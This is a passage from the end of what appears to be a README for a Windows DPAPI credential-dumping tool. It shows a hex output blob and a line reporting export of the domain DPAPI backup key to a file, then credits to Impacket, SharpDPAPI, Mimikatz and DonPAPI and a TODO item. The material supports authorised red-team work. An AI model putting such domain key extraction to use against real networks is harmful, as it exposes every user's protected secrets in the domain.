ad78a4991dbc8771aba7f26058fef848fd49fff622eed23e0dfcb453e178c189ae609cdb1aa2b1e4d4a8182c6dcd735581690d6fb52e5bddff1b37419cad1f84921235d5fa1e192c71bbada85527a14e7e06c53}


[-] Exporting domain backupkey to file key.pvk
```

## Credits

Those projects helped a lot in writting this tool:

- [Impacket](https://github.com/SecureAuthCorp/impacket) by the community
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
- [DonPAPI](https://github.com/login-securite/DonPAPI) by [LoginSecurite](https://twitter.com/LoginSecurite)

## TODO

- Implement LOCAL triage (with extracted stuff)
